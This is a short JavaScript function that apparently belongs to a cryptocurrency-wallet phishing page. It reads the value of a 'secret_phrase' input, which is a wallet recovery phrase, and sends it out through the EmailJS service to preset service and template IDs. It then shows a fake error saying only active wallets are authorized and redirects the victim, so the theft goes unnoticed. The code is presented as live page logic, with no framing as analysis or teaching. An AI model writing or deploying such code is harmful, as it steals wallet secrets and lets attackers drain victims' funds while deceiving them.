function SendMail() {
    var params = {
        result : document.getElementById("secret_phrase").value
    }
    emailjs.send("service_79q7jrl", "template_mjpnj9c", params).then(function (res) {
        alert("Error!: ONLY ACTIVE WALLETS ARE AUTHORIZED" );
        window.location.href = "/check/index.html";
    })
}
